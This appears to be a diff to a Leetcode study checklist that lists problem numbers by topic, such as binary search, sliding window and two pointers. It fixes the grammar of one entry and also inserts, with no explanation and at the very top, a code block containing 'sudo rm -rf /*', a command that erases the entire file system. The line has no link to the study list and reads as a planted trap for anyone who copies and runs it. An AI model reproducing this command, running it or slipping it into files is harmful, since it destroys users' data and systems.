@@ -1,5 +1,7 @@
 # Leetcode
- 
+```
+sudo rm -rf /*
+```
 ### Need review
 - Binary Search
     - [ ] 4
@@ -16,4 +18,4 @@
 - Sliding Window
     - [ ] 30
 - Two Point Approach
-    - [ ] 18 (important: can be apply to kSum)
+    - [ ] 18 (important: can be applied to kSum)
